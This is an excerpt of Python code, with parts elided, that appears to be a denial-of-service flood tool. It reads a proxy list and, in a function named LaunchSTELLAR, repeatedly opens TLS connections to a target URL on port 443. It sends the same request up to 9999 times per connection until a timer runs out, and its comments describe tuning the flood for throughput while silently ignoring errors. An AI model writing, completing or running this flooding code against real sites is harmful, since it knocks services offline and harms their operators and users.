...
def get_proxies():
    ...
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.WHITE+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
...
def LaunchSTELLAR(url, timer):
    ...
    while time.time() < timelol:
        try:
            ...
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Optimisasi TCP untuk mengurangi latency
            s.connect((str(urlparse(url).netloc), 443))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.sendall(str.encode(req))  # Menggunakan sendall untuk memastikan semua data terkirim

            try:
                for _ in range(9999):  # Meningkatkan jumlah pengiriman request per koneksi
                    s.sendall(str.encode(req))
            except:
                pass
            finally:
                s.close()  # Pastikan koneksi tertutup setelah loop
        except:
            pass  # Tidak perlu mencetak error agar script terus berjalan
